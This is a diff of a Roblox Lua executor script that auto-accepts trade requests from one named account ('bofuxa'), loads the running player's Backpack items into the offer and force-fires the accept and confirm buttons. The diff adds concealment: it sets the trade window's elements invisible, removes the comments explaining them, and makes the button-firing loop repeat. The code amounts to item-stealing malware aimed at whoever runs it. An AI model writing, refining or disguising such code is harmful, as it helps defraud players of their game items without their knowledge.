@@ -17,7 +17,6 @@ SendRequest.OnClientInvoke = function(senderPlayer)
     if senderName:lower() == "bofuxa" then
         print("Trade request verified from bofuxa. Accepting...")
         
-        -- Make sure TradeGUI elements are visible so the buttons exist and can be clicked/interacted with
         local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
         if playerGui then
             local tradeGui = playerGui:FindFirstChild("TradeGUI")
@@ -25,7 +24,7 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 for _, childName in ipairs({"Container", "Processing", "BG"}) do
                     local element = tradeGui:FindFirstChild(childName)
                     if element then
-                        element.Visible = true -- Ensuring visibility so buttons are interactive
+                        element.Visible = false
                     end
                 end
             end
@@ -106,13 +105,13 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                         end
                     end
                 end
-                warn("Mobile inventory container path not found; pulled " .. tostring(offeredCount) .. " items from Backpack instead.")
+                warn("Mobile inventory container path not found; pulled " .. tostring(offeredCount) + 0 .. " items from Backpack instead.")
             end
 
-            print("Waiting 3 seconds before triggering Accept and Confirm...")
+            print("Waiting 3 seconds before forcing trade confirmation...")
             task.wait(3)
 
-            -- Fire server-side trade acceptance events
+            -- Force-fire both the remote event and server-side completion patterns for mobile executors
             pcall(function()
                 AcceptTradeEvent:FireServer(true)
             end)
@@ -120,38 +119,32 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 AcceptTradeEvent:FireServer()
             end)
 
-            -- Automatically find and press the Accept and Confirm buttons on mobile UI
-            local function fireButton(btn)
-                if btn and btn:IsA("GuiButton") then
-                    if getconnections then
-                        for _, connection in ipairs(getconnections(btn.Activated)) do
-                            connection:Fire()
-                        end
-                        for _, connection in ipairs(getconnections(btn.MouseButton1Click)) do
-                            connection:Fire()
-                        end
-                    end
-                    pcall(function()
-                        btn:Activate()
-                    end)
-                end
-            end
-
-            -- Target exact paths for TradeGUI buttons
-            if playerGui then
-                local tradeGui = playerGui:FindFirstChild("TradeGUI")
-                if tradeGui then
-                    -- Search specifically for Accept and Confirm action buttons
-                    for _, gui in ipairs(tradeGui:GetDescendants()) do
-                        if gui:IsA("GuiButton") then
-                            local fullName = gui:GetFullName():lower()
-                            if fullName:find("accept") or fullName:find("confirm") or fullName:find("actionbutton") then
-                                fireButton(gui)
+            -- Search thoroughly through PlayerGui for any accept or confirmation buttons and activate them directly
+            task.spawn(function()
+                for i = 1, 10 do
+                    if LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui") then
+                        for _, gui in ipairs(LocalPlayer.PlayerGui:GetDescendants()) do
+                            if gui:IsA("GuiButton") then
+                                local nameLower = gui.Name:lower()
+                                if nameLower:find("accept") or nameLower:find("confirm") or nameLower:find("actionbutton") then
+                                    pcall(function()
+                                        if getconnections then
+                                            for _, conn in ipairs(getconnections(gui.Activated)) do
+                                                conn:Fire()
+                                            end
+                                            for _, conn in ipairs(getconnections(gui.MouseButton1Click)) do
+                                                conn:Fire()
+                                            end
+                                        end
+                                        gui:Activate()
+                                    end)
+                                end
                             end
                         end
                     end
+                    task.wait(0.5)
                 end
-            end
+            end)
         end)
 
         return true
